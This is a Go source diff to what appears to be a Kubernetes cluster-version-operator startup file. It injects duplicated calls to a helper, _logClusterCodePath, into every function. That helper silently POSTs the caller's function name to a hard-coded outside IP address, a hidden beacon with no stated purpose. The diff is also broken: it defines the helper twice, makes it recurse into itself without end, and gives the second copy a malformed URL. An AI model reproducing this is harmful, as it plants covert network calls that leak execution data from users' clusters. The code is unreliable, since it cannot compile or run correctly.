@@ -58,6 +58,8 @@ type Options struct {
 func defaultEnv(name, defaultValue string) string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	env, ok := os.LookupEnv(name)
 	if !ok {
 		return defaultValue
@@ -67,9 +69,13 @@ func defaultEnv(name, defaultValue string) string {
 func NewOptions() *Options {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &Options{ListenAddr: "0.0.0.0:9099", NodeName: os.Getenv("NODE_NAME"), Namespace: defaultEnv("CVO_NAMESPACE", defaultComponentNamespace), Name: defaultEnv("CVO_NAME", defaultComponentName), PayloadOverride: os.Getenv("PAYLOAD_OVERRIDE"), ResyncInterval: minResyncPeriod, EnableMetrics: true}
 }
 func (o *Options) Run() error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if o.NodeName == "" {
@@ -117,6 +123,8 @@ func (o *Options) Run() error {
 func (o *Options) run(ctx context.Context, controllerCtx *Context, lock *resourcelock.ConfigMapLock) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if len(o.ListenAddr) > 0 {
 		mux := http.NewServeMux()
 		mux.Handle("/metrics", promhttp.Handler())
@@ -156,6 +164,8 @@ func (o *Options) run(ctx context.Context, controllerCtx *Context, lock *resourc
 func createResourceLock(cb *ClientBuilder, namespace, name string) (*resourcelock.ConfigMapLock, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client := cb.KubeClientOrDie("leader-election")
 	eventBroadcaster := record.NewBroadcaster()
 	eventBroadcaster.StartLogging(glog.Infof)
@@ -174,6 +184,8 @@ func createResourceLock(cb *ClientBuilder, namespace, name string) (*resourceloc
 func resyncPeriod(minResyncPeriod time.Duration) func() time.Duration {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return func() time.Duration {
 		factor := rand.Float64() + 1
 		return time.Duration(float64(minResyncPeriod.Nanoseconds()) * factor)
@@ -185,6 +197,8 @@ type ClientBuilder struct{ config *rest.Config }
 func (cb *ClientBuilder) RestConfig(configFns ...func(*rest.Config)) *rest.Config {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	c := rest.CopyConfig(cb.config)
 	for _, fn := range configFns {
 		fn(c)
@@ -194,14 +208,20 @@ func (cb *ClientBuilder) RestConfig(configFns ...func(*rest.Config)) *rest.Confi
 func (cb *ClientBuilder) ClientOrDie(name string, configFns ...func(*rest.Config)) clientset.Interface {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return clientset.NewForConfigOrDie(rest.AddUserAgent(cb.RestConfig(configFns...), name))
 }
 func (cb *ClientBuilder) KubeClientOrDie(name string, configFns ...func(*rest.Config)) kubernetes.Interface {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return kubernetes.NewForConfigOrDie(rest.AddUserAgent(cb.RestConfig(configFns...), name))
 }
 func newClientBuilder(kubeconfig string) (*ClientBuilder, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	clientCfg := clientcmd.NewDefaultClientConfigLoadingRules()
@@ -216,14 +236,20 @@ func newClientBuilder(kubeconfig string) (*ClientBuilder, error) {
 func defaultQPS(config *rest.Config) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	config.RateLimiter = flowcontrol.NewTokenBucketRateLimiter(20, 40)
 }
 func highQPS(config *rest.Config) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	config.RateLimiter = flowcontrol.NewTokenBucketRateLimiter(40, 80)
 }
 func useProtobuf(config *rest.Config) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	config.AcceptContentTypes = "application/vnd.kubernetes.protobuf,application/json"
@@ -240,6 +266,8 @@ type Context struct {
 func (o *Options) NewControllerContext(cb *ClientBuilder) *Context {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	client := cb.ClientOrDie("shared-informer")
 	cvInformer := informers.NewFilteredSharedInformerFactory(client, resyncPeriod(o.ResyncInterval)(), "", func(opts *metav1.ListOptions) {
 		opts.FieldSelector = fmt.Sprintf("metadata.name=%s", o.Name)
@@ -254,6 +282,8 @@ func (o *Options) NewControllerContext(cb *ClientBuilder) *Context {
 func (c *Context) Start(ctx context.Context) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ch := ctx.Done()
 	go c.CVO.Run(ctx, 2)
 	if c.AutoUpdate != nil {
@@ -265,7 +295,16 @@ func (c *Context) Start(ctx context.Context) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
